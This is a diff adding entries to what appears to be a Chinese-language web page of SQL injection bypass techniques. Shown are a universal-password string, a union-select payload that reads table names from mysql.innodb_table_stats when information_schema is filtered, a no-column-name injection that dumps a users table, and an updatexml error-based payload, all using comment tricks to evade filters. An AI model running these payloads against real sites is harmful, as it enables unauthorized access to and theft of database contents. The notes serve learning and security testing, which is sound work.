@@ -146,6 +146,12 @@
 <p>12.万能密码：1’||1–%0c</p>
 <p>13.like 结合 % 进行通配绕过</p>
 <p>% 可以匹配任何数目的字符 ；_ 可以匹配单个字符</p>
+<p>14.过滤order by,information_schema：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>使用无列名注入查询字段信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>
+
 <h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h1><p>1.报错注入两个函数：</p>
 <p>（1）updatexml(xml_target, xpath_expr, new_xml)第一个参数：是string格式，为XML文档对象的名称。第二个参数：代表路径，Xpath格式的字符串。第三个参数：string格式，替换查找到的符合条件的数据。第二个参数跟extractvalue函数的第二个参数一样，因此也可利用且利用方式相同。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
